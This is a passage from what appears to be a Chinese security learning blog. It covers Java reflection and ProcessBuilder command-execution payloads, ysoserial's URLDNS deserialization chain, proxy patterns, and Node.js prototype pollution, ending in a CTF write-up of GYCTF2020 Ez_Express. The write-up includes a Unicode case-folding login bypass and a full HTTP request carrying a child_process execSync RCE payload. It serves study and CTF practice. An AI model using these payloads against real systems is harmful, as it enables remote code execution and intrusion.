，在进行初始化时按照以下优先级调用代码块\n\nstatic{}\n{}\n构造函数\n\n\n其中，static{}就是在“类初始化”时调用的，而{}中的代码会放在构造函数的super()后面，但在当前构造函数内容的前面\n所以forNmae中的initialize=true其实就是告诉jvm是否执行“类初始化”\n那么 如果有以下方法 其中的参数name可控：\npublic void ref(String name) throws Exception {\t\tClass.forName(name);}\n\n我们就可以编写一个恶意类，将恶意代码放置在static{}中，从而执行：\nclass PayLoad{    static{        try{            Runtime rt = Runtime.getRuntime();            String[] commands = {\"touch\", \"/etc/passwd\"};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e){        }    }}\n\n如何通过反射执行命令我们刚才提到，如果想拿到一个类，需要先import才能使用，而使用forname就不需要了，这样我们就可以利用forname加载任意类。\n在java中是支持内部类的，比如我们在普通类 c1中编写内部类c2，在编译时会生成两个文件：c1.class和c1$c2.class，这两个类之间可以看作没有关联，通过Class.forname(\"c1$c2\")即可加载这个内部类，当fastjson在checkAutotype时就会先讲$替换成. 上面说到的$的作用时查找内部类。\n当我们通过反射获取到一个类之后，可以继续通过反射来调用其中的属性和方法，也可以继续实例化这个类，调用其中的方法，也就是用newInstance()\n上面提到过newInstance会实例化类，并且触发它的构造方法，所以在一些情况下newInstance是不能成功执行的，比如\nClass clazz = Class.forName(\"java.lang.Runtime\");clazz.getMethod(\"exec\",String.class).invoke(clazz.newInstance(), \"id\");\n\n\n我们分析上面两行代码，首先通过反射将java.lang.Runtime中的所有属性和方法存到了clazz中，继续利用反射拿到clazz（Runtime）中的exec方法，最后使用invoke执行该方法，问题就出在乐invoke的参数上。\n我们上面提到了invoke执行方法，第一个参数是该方法所在的对象或者类，也就是说我们需要通过clazz.newInstance来实例化clazz，作为invoke的参数，但clazz的构造函数来自于Runtime，我们看一下Runtime的构造函数\n\nRuntime的构造方法为私有，所以在newInstance时才会报错。\n这里P神的java安全漫谈里说明了为什么要将构造方法设为私有，这就是很常见的“单例模式”。\n比如对于web应用来说，数据库只需要建立一次链接，而不是每次用到数据库都要建立一次新的连接，作为开发者就可以将数据库连接使用的构造函数设为私有，然后编写一个静态方法来获取：\npublic class TrainDB() {\tprivate static TrainDB instance = new TrainDB();\tpublic static TrainDB getInstance() {\t\treturn instance;\t}\tprivate TrainDB() {\t// 建立连接的代码\t}}\n\n在这个类初始化时，就会在类内部实例化出一个连接数据库的对象，我们在需要数据库连接时，只需要调用其中的getInstance()方法获取这个对象即可。\n回到如何执行命令上，如果不能通过实例化调用方法，我们就可以尝试继续通过反射来调用方法，我们将代码改成下面这样就可以了：\nClass clazz = Class.forname(\"java.lang.Runtime\");clazz.getMethod(\"exec\",String.class).invoke(clazz.getMethod(\"getRuntime\").invoke(clazz),\"calc.exe\");\n\n我们在刚开始执行命令时就用到了Runtime来获取其中的exec方法，不难看出它和python的os类似，给我们提供了一些可以执行命令的方法，那么Runtime到底有什么作用？每当我们执行一个java程序时，Runtime类都会生成一个实例，来储存当前运行的java程序的相关信息，我们可以通过Runtime类中的getRuntime()方法来调用当前java程序的运行环境（也就是上面提到的储存相关信息的实例），这样就可以在执行系统命令时让jvm知道我们要对哪个java程序执行命令\n我们分析以下上面执行命令的两行代码\n\n通过反射获得Runtime类\n通过反射获得clazz(Runtime)中的exec方法\ninvoke()调用exec方法\n调用getRuntime()将当前java程序运行的环境作为参数传递给invoke，并执行命令exec \"calc.exe\"\n\n可以发现我们在用invoke执行Runtime中的命令时，如果不能通过newInstance来实例化对象作为参数，我们可以通过调用getRuntime()来获取当前环境，从而代替invoke的第一个参数。\n上面执行命令的两行代码分解开就是：\nClass clazz = Class.forname(\"java.lang.Runtime\");Method execMethod = clazz.getMethod(\"exec\", String.class);Method getRuntime = clazz.getMethod(\"getRuntime\")；Object currentRuntime = getRuntime.invoke(clazz);execMethod.invoke(currentRuntime, \"calc.exe\");\n\n一些其他的反射机制\n我们刚才说到可以通过forname拿到了一个类，并且继续利用反射或实例化调用其中的方法，如果一个类没有无参构造方法或者也没有类似单例模式里的静态方法，那我们应该怎样通过反射实例化该类呢？\n如果一个方法或构造方法是私有方法，我们应该怎么去执行它呢？\n\n利用ProcessBuilder执行命令第一个问题，我们可以用一个新的反射方法getConstructor。\n和getMethod类似，getConstructor接收的参数是构造函数的的列表类型，因为构造函数也支持重载，所以要用参数列表类型才能唯一确定一个构造函数\n比如我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后 调用start()来执行命令\nProcessBuilder:\nProcessBuilder用于创建操作系统进程，它提供一种启动和管理进程（也就是应用程序）的方法，我们可以通过实例化这个类并且通过反射调用其中的start方法来开启一个子进程 ，我们可以理解成当getRuntime被禁用时，可以用ProcessBuilder来执行命令。\nProcessBuilder有两个构造函数：\n\npublic ProcessBuilder(List&lt;String&gt; command)\npublic ProcessBuilder(String... commang)\n\n我们用ProcessBuilder写一个执行命令的payload：\nClass clazz = Class.forName(\"java.lang.ProcessBuilder\");((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(\"calc.exe\"))).start();\n\n\n首先利用反射获取ProcessBuilder类；\n获取clazz(ProcessBuilder)形参列表为List&lt;String&gt; command的构造函数；\n将获取到的构造函数利用newInstance进行实例化，调用构造函数；\n对构造函数传入的参数为 calc.exe，并且用Arrays.asList方法将要执行的命令转为List类型；\n返回List类型的command；  \n将List类型的command强制转换为ProcessBuilder类型，这样就可以调用ProcessBuilder中的start方法打开calc.exe进程。 \n\n 可以看到这个方法需要用到强转，但有时候在利用漏洞时并没有这种语法，所以我们接着利用反射来完成这一步 Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); clazz.getMethod(\"start\").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(\"calc.exe\")));\n\nforName获取类；\n获取clazz中的start方法；\n用invoke执行start方法，这里我们之前说过用invoke执行方法时，第一个参数要是该方法所在类的对象，但clazz中没有无参构造方法，所以invoke的第一个参数不能是clazz.newInstance，所以这里我们换个方法，通过getConstructor获取到ProcessBuilder的构造函数，并利用这个构造函数newInstance，在实例化的同时对构造方法传入参数calc.exe，因为我们刚才提到了ProcessBuilder是没有无参构造函数的，所以在实例化的时候必须要传入参数。（这里获取的构造方法依然是上面提到的形参列表为List的构造函数）\n\n 那么我们再来看ProcessBuilder的另一个构造方法：  我们看到这个构造方法的参数列表为String... command，这个参数列表的意思其实就是参数数量可变列表，当我们在写一个方法时，不知道要传入多少参数，我们就可以写成Type... Args的方式，其实在底层来看String... command这样的写法就等效于String[] command，相当于传入了一个字符数组 比如有一个hello方法： public void hello(String...names){}\n 如果我们有一个数组想传给y1方法，只需要直接传就行： String[] names = {\"hello\", \"world\"};hello(names)\n 所以如果我们想要获取到参数列表为String... command 的这个构造方法，我们在getConstructor时要传入的参数为String[].class，在调用newInstance时，因为这个构造方法本身接受的就是一个可变长数组，我们在传入时也传入了一个数组，因此叠加起来是一个二维数组，所以利用这个构造方法的payload如下： Class clazz = Class.forName(\"java.lang.ProcessBuilder\");((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[]{{\"calc.exe\"}})).start();\n\n反射拿到类；\ngetConstructor拿到参数列表为String... command的构造方法；\nnewInstance触发该构造方法，并且传入一个二维字符数组；\n由于返回的command是字符数组类型，所以强转为ProcessBuilder并用start()方法触发；\n\n\n\n如何通过反射执行私有方法再回到第二个问题上，如果一个方法或构造方法是private，我们是否能执行它呢？\n这里就要用到getDeclared系列的反射了，与普通的getMethod，getConstructor区别是：\n\ngetMethod系列方法获取的是当前类中所有公共方法，包括从父类继承的方法；\ngetDeclaredMethod系列方法获取的是当前类中“声明”的方法，是实写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了\n\n在用法上getDeclaredMethod的具体用法与getMethod类似，getDeclaredConstructor的具体用法和getConstructor类似\n举个例子，我们之前提到过Runtime的构造方法是私有的，所以我们要通过Runtime.getRuntime()来获取对象，其实我们也可以直接用getDeclaredConstructor来获取这个私有的构造方法实例化对象，进而执行命令：\nClass clazz = Class.forName(\"java.lang.Runtime\");        Constructor m =clazz.getDeclaredConstructor();        m.setAccessible(true);        clazz.getMethod(\"exec\",String.class).invoke(m.newInstance(), \"calc.exe\");\n\n这里我们在获取到私有方法后，要用setAccessible()方法使这个私有方法可以被访问，其他的就和之前介绍的反射一样了，如果不用setAccessible()方法修改作用域这个方法是仍然不能调用的\n————————————————————————————————————————————\nysoserial在上手java反序列化的第一条链子之前，我们需要一个集成了java反序列化各种gadget chains（利用链）的工具，ysoserial。\nysoserial下载好后还需要再安装一些其他的依赖，教程网上有很多，我就不细说了，我们先简单了解一下ysoserial中一些比较重要的东西。\n首先是序列化（Serialize）：\n\n这个序列化操作和我之前提到的基本是一样的，将一个对象以字节流的形式输出并保存，并触发它的writeObject。\n反序列化（Unserialize 再ysoserial中叫Deserialize）：\n\n将一个字节流读入还原为对象并触发它的readObject。\nPayloadrunner：\n\n可以看到在Payloadrunner中，先将对象序列化再反序列化，其实就是用来运行我们的链，并生成相应的payload，具体执行命令（用cc链举例）：\njava -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 \"id\"\n\n如果我们直接再intellij中运行这些链，不会出现payload，并且要注意一个问题，在java反序列化中几乎我们反序列化执行命令的结果是没有回显的，所以我们需要用一些比较明显的命令让我们知道这个链子被成功触发了，在ysoserial中我们一般用计算器calc.exe，一般来说ysoserial安装好后payload默认的参数是calc.exe，如果不是的话就要自己手动设置默认参数了，具体的我就不多说了。\nURLDNS那么我们来上手java反序列化的第一条链子，URLDNS，这条链子的利用链很短，我们看一下ysoserial中的代码：\npublic class URLDNS implements ObjectPayload&lt;Object&gt; {        public Object getObject(final String url) throws Exception {                //Avoid DNS resolution during payload creation                //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.                URLStreamHandler handler = new SilentURLStreamHandler();                HashMap ht = new HashMap(); // HashMap that will contain the URL                URL u = new URL(null, url, handler); // URL to use as the Key                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.                Reflections.setFieldValue(u, \"hashCode\", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.                return ht;        }        public static void main(final String[] args) throws Exception {                PayloadRunner.run(URLDNS.class, args);        }        /**         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior         * using the serialized object.&lt;/p&gt;         *         * &lt;b&gt;Potential false negative:&lt;/b&gt;         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the         * second resolution.&lt;/p&gt;         */        static class SilentURLStreamHandler extends URLStreamHandler {                protected URLConnection openConnection(URL u) throws IOException {                        return null;                }                protected synchronized InetAddress getHostAddress(URL u) {                        return null;                }        }}\n\n一点点分析一下，首先从URL的创建开始：\nURLStreamHandler handler = new SilentURLStreamHandler();                HashMap ht = new HashMap(); // HashMap that will contain the URL                URL u = new URL(null, url, handler); // URL to use as the Key                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.\n\n\n先是用URLStreamHandlerc创建了一个句柄，这个句柄可以打开一个指定的url。\n创建一个哈希表，并将url对象u作为key存入到了哈希表中。\n\nReflections.setFieldValue(u, \"hashCode\", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.                return ht;        }        public static void main(final String[] args) throws Exception {                PayloadRunner.run(URLDNS.class, args);        }\n\n\n这里将url对象u的hashCode设置成了-1，为什么要这么做我们一会在分析具体的触发过程时会提到。\n返回了哈希表对象ht，并用PayloadRunner运行该利用链。\n\n这段代码就干了这些事，那么是怎么触发反序列化的呢，我们之前提到过在反序列化时会触发readObject，那么我们直接去看Hashmap的readObject方法：\n\n最重要的一行就是最后的putValue，里面计算了哈希表的键名。我们跟一下putValue方法，发现利用hash方法计算了哈希表的key。\n\n我们再继续跟进hash方法，发现这里调用了哈希表key的hashcode方法，我们回到刚才创建哈希表时，是把url对象存入到了key中，所以我们直接去找java.net.URL的hashCode方法。\n\n\n如果hashCode值不为-1，那么就会return，这个就是我们前面提到要将hashCode的值设置为-1的原因。\n我们继续跟，handler此时是一个URLStreamHandler对象，继续跟进它的hashCode方法。\n\n这里调用了getHostAddress方法，继续跟。\n\n到这里可以看到InetAddress.getByName(host)的作用是根据主机名，获取其ip地址，在网络上就是一次DNS查询，我们可以通过burp的Collaborator client来看到这次url请求。\n\n代理模式在Spirng中，AOP的底层实现就是代理模式，代理模式分为两种：\n\n静态代理\n动态代理\n\n什么是代理？我们用一个租房的例子来说明，按照正常的逻辑来讲，房东想要将自己的房子出租，并且此时有一个租客想租这个房子，那么租客就可以直接找到房东完成租房子这件事：\n\n但是现在房东不想处理一些在租房过程中需要进行的繁琐步骤，比如打广告啊，和租客议价等等，所以这时候出现了一个新角色，叫做中介，那么此时房东所做的事只有出租自己的房子，其他事项全部交由中介来做，所以这个时候租客如果想租房子是不能直接找到房东的，必须在中间经由中介，中介来完成大部分事宜，并且在此时中介与房东共同完成租房这件事：\n\n静态代理角色分析：\n\n抽象角色（租房这件事）：一般会使用抽象类或者接口来解决\n真实角色（房东）：被代理的角色\n代理角色（中介）：代理真实角色，代理真实角色后，我们一般会做一些附属操作\n客户（租客）：访问代理对象的人\n\n代码实现：\n租房 Rent接口：\npackage com.y1zh3e7.demo01;public interface Rent {    public void rent();}\n\n房东 Host类：\npackage com.y1zh3e7.demo01;public class Host implements Rent{    public void rent()    {        System.out.println(\"房东要出租房子\");    }}\n\n中介 Proxy类：\npackage com.y1zh3e7.demo01;public class Proxy implements Rent{    private Host host;    public Proxy() {    }    public Proxy(Host host) {        this.host = host;    }    public void rent(){        host.rent();        seeHouse();        getFare();    };    public void seeHouse()    {        System.out.println(\"中介带你看房\");    }    public void getFare()    {        System.out.println(\"中介收中介费了\");    }}\n\n租客 Client类：\npackage com.y1zh3e7.demo01;public class Client {    public static void main(String[] args) {        Host host = new Host();        Proxy proxy = new Proxy(host);    }}\n\n可以发现房东只专注实现了租房这件事，而中介不仅帮房东实现了租房，而且自己也添加了格外的功能，比如看房收中介费等等。\n代理模式的好处：\n\n可以时真是角色的目的更加纯粹，不用去关注一些公共的业务\n公共业务交给代理角色，实现了业务的分工\n公共业务发生扩展时，便于集中管理\n\n缺点：\n\n一个真实角色就会产生一个代理角色，代码量翻倍，开发效率变低\n\n动态代理\n动态代理和静态代理角色一样\n动态代理的代理类是自动生成的，不是我们直接写好的\n动态代理分为三大类：\n基于接口的动态代理——JDK的动态代理\n基于类的动态代理——cglib\njava字节码实现——Javassist\n\n\n\n动态代理需要了解两个类：Proxy：代理，InvocationHandler：调用处理程序\n整个动态代理大概流程如下：\n\nProxy.newProxyInstance 生成一个动态代理对象proxy，并且告诉这个proxy要代理哪个接口，这里注意此时必须要是接口才行，动态代理是无法代理一个类的，因此当动态代理接收到一个类时要转为该类所继承的接口。\n客户调用被代理对象的某一方法，此时java会将访问代理对象这个请求转发给动态代理对象proxy，并且在proxy的invoke中实现该方法\n\n代码实现：Rent接口 被代理对象和proxy对象共同实现的接口：\npackage com.y1zh3e7.demo03;public interface Rent {    public void rent();}\n\nHost 被代理对象:\npackage com.y1zh3e7.demo03;public class Host implements Rent {    public void rent()    {        System.out.println(\"房东要出租房子\");    }}\n\n动态代理工具类 ProxyInvocationHandler：\npackage com.y1zh3e7.demo03;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class ProxyInvocationHandler implements InvocationHandler {    private Rent rent;\t\t// 使用动态代理时通过setter传入要被代理的对象    public void setRent(Rent rent) {        this.rent = rent;    }\t\t// 通过getProxy方法获得一个动态代理实例    public Object getProxy()    {\t\t\t// 通过Proxy.newProxyInstance初始化一个动态代理对象出来 三个参数基本上只有第二个是变化的，为被代理的接口，其他两个参数可以像这里一样写死        return Proxy.newProxyInstance(this.getClass().getClassLoader(), rent.getClass().getInterfaces(), this);    }    @Override\t\t// 当调用一个被代理对象的方法时，会在此处执行，invoke内可以自己构造如何执行该方法，从而达到了扩展方法功能的目的\t\t// 三个参数分别为 代理对象 代理对象被调用的方法 调用该方法的参数    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {       Object result =  method.invoke(rent,args);        return result;    }}\n\nClient\npackage com.y1zh3e7.demo03;public class Client {    public static void main(String[] args) {        Host host = new Host();        ProxyInvocationHandler pih = new ProxyInvocationHandler();        pih.setRent(host); // 将要代理的对象设置为host        Rent proxy = (Rent) pih.getProxy(); // 拿到被代理接口的代理对象        proxy.rent(); // 调用该方法后会将这个方法传给代理对象中的invoke方法来执行    }}\n","categories":["WebSec"],"tags":["Java反序列化"]},{"title":"Nodejs原型链污染","url":"/2023/04/21/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","content":"Nodejs原型链污染Nodejs与JavaScript和JSON有一些人在学习JavaScript时会分不清Nodejs和JavaScript之间的区别 如果没有node 那么我们的JavaScript代码则由浏览器中的JavaScript解析器进行解析 几乎所有的浏览器都配备了JavaScript的解析功能（最出名的就是google的v8） 这也是为什么我们能在f12中直接执行JavaScript的原因  而Nodejs则是由这个解析器单独从浏览器中拿出来 并进行了一系列的处理 最后成为了一个可以在服务端运行JavaScript的环境  这里看到一个很好的例子 学过java的师傅应该就明白了\n\n那么JSON又是什么呢 简单概括一下就是JavaScript的对象表示方法 它表示的是声明对象的一种格式  由于我们从前端接收到的数据基本都是字符串 因此在服务端如果要将这些字符串处理为其他格式 比如对象 就需要用到JSON了 \n\n原型对象（prototype）与原型连接点（__proto__）与原型链\n在c++或java这些面向对象的语言中 我们如果想要一个对象首先需要使用关键字class声明一个类 再使用关键字new一个对象出来 但是在JavaScript中没有class 以及类这种概念（为了简化编写JavaScript代码，ECMAScript 6后增加了class语法，但class其实只是一个语法糖） 在JavaScript有这么两种声明对象的方式 为了好理解我们先引入类的思想\nperson=new Object()person.firstname=\"John\";person.lastname=\"Doe\";person.age=50;person.eyecolor=\"blue\";这种创建对象的方法还有另一种写法 如下person={firstname:\"John\",lastname:\"Doe\",age:50,eyecolor:\"blue\"};这种方法通过直接实例化构造方法Object()来创建对象\n\nfunction person(firstname,lastname,age,eyecolor)  这里创建了一个“类” 但是在JavaScript中叫做构造函数或者构造器{    this.firstname=firstname;    this.lastname=lastname;    this.age=age;    this.eyecolor=eyecolor;}var myFather=new person(\"John\",\"Doe\",50,\"blue\");\t通过这个“类”实例化对象var myMother=new person(\"Sally\",\"Rally\",48,\"green\");这种方法先创建构造函数 再实例化构造函数 构造函数function也属于Object 如果对这里为什么属于Object而不属于Function有疑问请继续阅读 下面会解释\n\n既然是通过实例化Object来创建对象或创建构造函数\n 在JavaScript中有两个很特殊的对象 Function() 和 Object()  它们两个既是构造函数也是对象 作为对象是不是应该有一个“类”去作为他们的模板呢\n对于Object()来说 要声明这么一个构造函数我们可以使用关键字function来创建 （在底层 使用function创建一个函数 其实就相当于这个过程） \nfunction Object(){}在底层为var Object = new Function();\n\n那么对于Function自己这个对象他是怎么来的呢 如果用Function.__proto__和Function.prototype进行比较发现二者是全等的 所以Function创造了自己 也创造了Object 所以JavaScript中 所有函数都是对象 而对象是通过函数创建的 因此构造函数.prototype.__proto__ 应该是Object.prototype 而不是Function.prototype   Function的作用是创建而不是继承\n\n\n那么提到了__proto__和prototype我们就来说说这两个是什么东西\n首先我们要了解以下概念\n\n__proto__是任何一个对象拥有的属性    prototype是任何一个函数拥有的一个属性  \n\n比如\nperson={firstname:\"John\",lastname:\"Doe\",age:50,eyecolor:\"blue\"};\n\n那么这个person对象就拥有了person.__proto__这个属性 而Object()我们刚才提到了是由Function创建来的一个构造函数 那么Object就天生有了Object.prototype \n\n某一对象的 __proto__指向它的prototype（原型对象） 也就是说如果直接访问person.__proto__ 那么就相当于访问了Object.prototype\nJavaScript使用prototype链实现继承机制\n构造函数xxx.prototype是一个对象 xxx.prototype也有自己的__proto__属性 并且可以继续指向它的的prototype\nObject.prototype.proto最终指向null 这也是所有原型链的终点\n从一个对象的__proto__不断向上指向原型对象最终指向Objecct.prototype后接着指向为Null 这一条链子就叫做原型链\n\n有条件的师傅也可以把下面的视频合集看一下 对理解原型和原型链有很大的帮助\n4_Function与Object的特殊性_哔哩哔哩_bilibili\n 如果我们有如下代码：\nfunction Father() {    this.first_name = 'Donald'    this.last_name = 'Trump'}function Son() {    this.first_name = 'Melania'}Son.prototype = new Father()let son = new Son()console.log(`Name: ${son.first_name} ${son.last_name}`)\n\n那么按照上述说法 就有如下结构\n\n对于对象son，在调用son.last_name的时候，实际上JavaScript引擎会进行如下操作：\n\n在对象son中寻找last_name\n如果找不到，则在son.__proto__中寻找last_name\n如果仍然找不到，则继续在son.__proto__.__proto__中寻找last_name\n依次寻找，直到找到null结束。\n\n原型链污染举个栗子\n// 这个对象直接实例化Object()let foo = {bar: 1}// foo.bar 此时为1console.log(foo.bar)// 修改foo的原型（即Object）foo.__proto__.bar = 2// 由于查找顺序的原因，foo.bar仍然是1console.log(foo.bar)// 此时再用Object创建一个空的zoo对象let zoo = {}// 查看zoo.barconsole.log(zoo.bar)\n\n\n这里由于修改了foo.__proto__.bar 也就是修改了Object.bar 因此在后续的实例化对象中 新的对象会继承这一属性 造成了原型链污染\n在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？\n我们思考一下，哪些情况下我们可以设置__proto__的值呢？其实找找能够控制数组（对象）的“键名”的操作即可\n看下面代码 一个简单的对象clone\nfunction merge(target, source) {    for (let key in source) {        if (key in source &amp;&amp; key in target) {              // 如果target与source有相同的键名 则让target的键值为source的键值            merge(target[key], source[key])        } else {            target[key] = source[key]  // 如果target与source没有相通的键名 则直接在target新建键名并赋给键值        }    }}let o1 = {}let o2 = {a: 1, \"__proto__\": {b: 2}}merge(o1, o2)console.log(o1.a, o1.b)o3 = {}console.log(o3.b)\n\n\n这里执行后发现 虽然两个对象成功clone 但是Object()并没用被污染 这是因为在创建o2时 __proto__是已经存在于o2中的属性了 解析器并不能将这个属性解析为键值 所以要用JSON去修改代码（前面我们说了 JSON是JavaScript的对象表示方法 可以将字符串转换为对象） 这样就可以使__proto__被成功解析成键名了\nlet o1 = {}let o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}')merge(o1, o2)console.log(o1.a, o1.b)o3 = {}console.log(o3.b)\n\n\n漏洞复现[GYCTF2020]Ez_Express进入环境之后是一个登录页面 测试之后发现存在www.zip源码泄露 开始审计index.js\nvar express = require('express');var router = express.Router();const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;const merge = (a, b) =&gt; {  for (var attr in b) {    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) {      merge(a[attr], b[attr]);    } else {      a[attr] = b[attr];    }  }  return a}const clone = (a) =&gt; {  return merge({}, a);}function safeKeyword(keyword) {  if(keyword.match(/(admin)/is)) {      return keyword  }  return undefined}router.get('/', function (req, res) {  if(!req.session.user){    res.redirect('/login');  }  res.outputFunctionName=undefined;  res.render('index',data={'user':req.session.user.user});});router.get('/login', function (req, res) {  res.render('login');});router.post('/login', function (req, res) {  if(req.body.Submit==\"register\"){   if(safeKeyword(req.body.userid)){    res.end(\"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;\")    }    req.session.user={      'user':req.body.userid.toUpperCase(),      'passwd': req.body.pwd,      'isLogin':false    }    res.redirect('/');   }  else if(req.body.Submit==\"login\"){    if(!req.session.user){res.end(\"&lt;script&gt;alert('register first');history.go(-1);&lt;/script&gt;\")}    if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd){      req.session.user.isLogin=true;    }    else{      res.end(\"&lt;script&gt;alert('error passwd');history.go(-1);&lt;/script&gt;\")    }    }  res.redirect('/'); ;});router.post('/action', function (req, res) {  if(req.session.user.user!=\"ADMIN\"){res.end(\"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;\")}   req.session.user.data = clone(req.body);  res.end(\"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;\");  });router.get('/info', function (req, res) {  res.render('index',data={'user':res.outputFunctionName});})module.exports = router;\n\n看下面两段代码\nfunction safeKeyword(keyword) {  if(keyword.match(/(admin)/is)) {      return keyword  }  return undefined}\n\nrouter.post('/login', function (req, res) {  if(req.body.Submit==\"register\"){   if(safeKeyword(req.body.userid)){    res.end(\"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;\")    }    req.session.user={      'user':req.body.userid.toUpperCase(),      'passwd': req.body.pwd,      'isLogin':false    }    res.redirect('/');   }  else if(req.body.Submit==\"login\"){    if(!req.session.user){res.end(\"&lt;script&gt;alert('register first');history.go(-1);&lt;/script&gt;\")}    if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd){      req.session.user.isLogin=true;    }    else{      res.end(\"&lt;script&gt;alert('error passwd');history.go(-1);&lt;/script&gt;\")    }    }  res.redirect('/'); ;});\n\n只有用admin登录才会return keyword 否则返回undefined 返回undefined就会弹窗forbid word 如果username经过toUpperCase后不能与原来的匹配 或password错误 就会弹窗error passwd 这也是为什么题中说用户名只支持大写\n再看这段 就很恶心 如果username为ADMIN就不能登录 又不让用admin 又得用admin登录 这里就用到了JavaScript大小写的漏洞\n原理移步p神博客 Fuzz中的javascript大小写特性 | 离别歌 (leavesongs.com)\nif(req.session.user.user!=\"ADMIN\"){res.end(\"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;\")} \n\n所以用ADMıN来绕过 注意不是ADMiN 中间那个i是一个奇怪的字符 把username输入ADMıN直接注册就可以了（题目环境怪怪的 有的时候ADMıN 不行就试试admın）登录进去还给了flag的位置\n\n\n这里试了试没啥用 继续看源码 上面提到了 merge clone操作可以控制键值和键名 从而达到污染\nconst merge = (a, b) =&gt; {  for (var attr in b) {    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) {      merge(a[attr], b[attr]);    } else {      a[attr] = b[attr];    }  }  return a}const merge = (a, b) =&gt; {  for (var attr in b) {    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) {      merge(a[attr], b[attr]);    } else {      a[attr] = b[attr];    }  }\n\n往下看找到调用clone的位置\nrouter.post('/action', function (req, res) {  if(req.session.user.user!=\"ADMIN\"){res.end(\"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;\")}   req.session.user.data = clone(req.body);  res.end(\"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;\");  });\n\n也就是说我们可以在action路由下通过请求体来进行污染 原型链污染的位置找到了 接下来就是要找到可以用来控制键名和键值的对象\n看到这段\nrouter.get('/info', function (req, res) {  res.render('index',data={'user':res.outputFunctionName});})\n\nrender函数应该不陌生 在模板注入攻击（SSTI）中很常见  这里将回显req的outputFunctionNmae渲染到了index中 那么我们是不是可以利用outputFunctionName进行SSTI从而达到rce呢 代码跟下来我们发现并没有outputFunctionName这个东西 也就是说它是我们可以用来污染原型链的载体 如果把Object的prototype中加上键名为outputFunctionName 键值为恶意payload的属性 那么在进行模板渲染时 是不是就会执行我们的恶意payload\n但是我们考虑一个问题 如何去修改Object的prototype （确实是可以的 但是有点麻烦 下面参考文章的最后一篇就是直接修改Object的prototypr）我们重新回到这段代码\nrouter.post('/action', function (req, res) {  if(req.session.user.user!=\"ADMIN\"){res.end(\"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;\")}   req.session.user.data = clone(req.body);  res.end(\"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;\");  });\n\n发现请求体被clone到了req.session.user.data中 对于req.session.user这个对象来说 它的__proto__属性是不是就是Object的prototype 所以我们可以修改了这个对象的__proto__从而达到目的\nreq.session.user={      'user':req.body.userid.toUpperCase(),      'passwd': req.body.pwd,      'isLogin':false    }\n\nSSTI的payload我也不是很懂 反正原理都是不断调用原型对象 最后找到一个可以用来rce的函数 payload和CVE-2019-10744是一样的 直接搬来用了\n{\"__proto__\":{\"outputFunctionName\":\"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');//\"}}\n\n污染成功后在info路由下调用res.outputFunctionName时 就像上面调用son.last_name的过程一样 最终调用到了Object的outputFunctionName 并且要让__proto__为键名 要用JSON格式 所以要用burp拦包添加content type（在进行POST传参时必须有该头） 放个包做个参考 记得路由和传参方式也要改 再传payload\nPOST /action HTTP/1.1Host: 8f9161b2-5acd-465d-8854-969004e758fb.node4.buuoj.cn:81Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://8f9161b2-5acd-465d-8854-969004e758fb.node4.buuoj.cn:81/loginAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: session=s%3A1jilnCKBesMA5qC1gPlt6SPb18ntn7h7.4wyQ3TbDJtVXUhdOdErxMFKs6EcCnNrCkeUjRFYK3MYContent-Type: application/jsonConnection: closeContent-Length: 137{\"__proto__\":{\"outputFunctionName\":\"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');//\"}}\n\n在action路由下污染成功后应该接着访问info路由进行SSTI 但是不知道为啥我包发过去直接给flag了 \n\n参考文章深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)\n【全网首发:已完结】快速搞懂『原型、原型链』【JavaScript基础专题】_哔哩哔哩_bilibili\n GYCTF2020]Ez_Express 